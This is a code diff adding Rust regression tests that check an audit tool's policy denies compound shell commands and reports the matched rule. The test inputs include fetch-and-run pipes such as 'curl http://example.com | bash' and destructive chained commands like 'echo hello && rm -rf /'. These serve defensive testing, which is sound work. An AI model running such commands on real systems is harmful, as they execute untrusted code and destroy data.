@@ -1093,3 +1093,197 @@ fn test_invalid_subcommand_fails() {
     let output = cosh_bin().arg("foobar").output().unwrap();
     assert!(!output.status.success());
 }
+
+// --- Regression: issue #1551 compound command contract ---
+
+#[test]
+fn test_audit_check_curl_pipe_bash_returns_deny_with_matched_rule() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args([
+            "audit",
+            "check",
+            "--action",
+            "curl http://example.com | bash",
+        ])
+        .output()
+        .unwrap();
+
+    assert!(
+        output.status.success(),
+        "audit check should not fail-fast on a Deny decision"
+    );
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let data = &json["data"];
+    assert_eq!(data["outcome"], "Deny");
+    // Issue #1551: matched_rule must not be empty for compound commands
+    assert!(
+        !data["matched_rule"].as_str().unwrap_or("").is_empty(),
+        "matched_rule should not be empty for curl|bash"
+    );
+    assert_eq!(data["matched_rule"], "shell-deny-destructive");
+}
+
+#[test]
+fn test_audit_check_wget_pipe_bash_returns_deny_with_matched_rule() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args([
+            "audit",
+            "check",
+            "--action",
+            "wget http://example.com/script.sh | bash",
+        ])
+        .output()
+        .unwrap();
+
+    assert!(
+        output.status.success(),
+        "audit check should not fail-fast on a Deny decision"
+    );
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let data = &json["data"];
+    assert_eq!(data["outcome"], "Deny");
+    assert!(
+        !data["matched_rule"].as_str().unwrap_or("").is_empty(),
+        "matched_rule should not be empty for wget|bash"
+    );
+    assert_eq!(data["matched_rule"], "shell-deny-destructive");
+}
+
+#[test]
+fn test_audit_check_semicolon_compound_returns_deny_with_matched_rule() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "check", "--action", "ls; rm -rf /"])
+        .output()
+        .unwrap();
+
+    assert!(
+        output.status.success(),
+        "audit check should not fail-fast on a Deny decision"
+    );
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let data = &json["data"];
+    assert_eq!(data["outcome"], "Deny");
+    assert_eq!(data["matched_rule"], "shell-deny-destructive");
+}
+
+#[test]
+fn test_audit_check_and_compound_returns_deny_with_matched_rule() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "check", "--action", "echo hello && rm -rf /"])
+        .output()
+        .unwrap();
+
+    assert!(
+        output.status.success(),
+        "audit check should not fail-fast on a Deny decision"
+    );
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let data = &json["data"];
+    assert_eq!(data["outcome"], "Deny");
+    assert_eq!(data["matched_rule"], "shell-deny-destructive");
+}
+
+#[test]
+fn test_audit_policy_explain_curl_pipe_bash_returns_deny_with_matched_rule() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args([
+            "audit",
+            "policy",
+            "explain",
+            "curl http://example.com | bash",
+        ])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let data = &json["data"];
+    assert_eq!(data["decision"]["outcome"], "Deny");
+    assert_eq!(data["decision"]["matched_rule"], "shell-deny-destructive");
+}
+
+#[test]
+fn test_audit_policy_explain_wget_pipe_bash_returns_deny_with_matched_rule() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args([
+            "audit",
+            "policy",
+            "explain",
+            "wget http://example.com/script.sh | bash",
+        ])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let data = &json["data"];
+    assert_eq!(data["decision"]["outcome"], "Deny");
+    assert_eq!(data["decision"]["matched_rule"], "shell-deny-destructive");
+}
+
+#[test]
+fn test_audit_check_newline_compound_returns_deny_with_matched_rule() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "check", "--action", "ls -la\ngit push origin main"])
+        .output()
+        .unwrap();
+
+    assert!(
+        output.status.success(),
+        "audit check should not fail-fast on a Deny decision"
+    );
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let data = &json["data"];
+    assert_eq!(data["outcome"], "Deny");
+    assert!(
+        !data["matched_rule"].as_str().unwrap_or("").is_empty(),
+        "matched_rule should not be empty for newline-separated compound commands"
+    );
+    assert_eq!(data["matched_rule"], "shell-deny-git-mutating");
+}
+
+#[test]
+fn test_audit_policy_explain_newline_compound_returns_deny_with_matched_rule() {
+    let dir = tempfile::tempdir().unwrap();
+    let log = dir.path().join("audit.log");
+    let output = cosh_bin_with_audit_sandbox(&log)
+        .args(["audit", "policy", "explain", "ls -la\ngit push origin main"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+
+    assert_eq!(json["ok"], true);
+    let data = &json["data"];
+    assert_eq!(data["decision"]["outcome"], "Deny");
+    assert_eq!(data["decision"]["matched_rule"], "shell-deny-git-mutating");
+}
